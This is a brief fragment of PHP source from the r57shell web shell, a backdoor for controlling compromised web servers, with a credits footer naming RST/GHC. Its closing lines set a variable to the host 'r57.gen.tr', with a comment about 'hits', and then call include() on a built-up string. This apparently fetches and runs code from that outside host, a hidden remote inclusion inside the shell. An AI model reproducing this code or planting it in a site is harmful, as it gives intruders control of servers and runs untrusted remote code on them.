...
$b = "r57.gen.tr"; //need hits "shell created by evilc0ders"
/******************************************************************************************************/
...
echo '</table>'.$table_up3."</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by RST/GHC | <a href=http://rst.void.ru>http://rst.void.ru</a> | <a href=http://ghc.ru>http://ghc.ru</a> | <a href=r57.gen.tr >http://r57.gen.tr</a> | version ".$version." ]---o</b></font></div></td></tr></table>".$f;
include ($a.$b.$c);
?>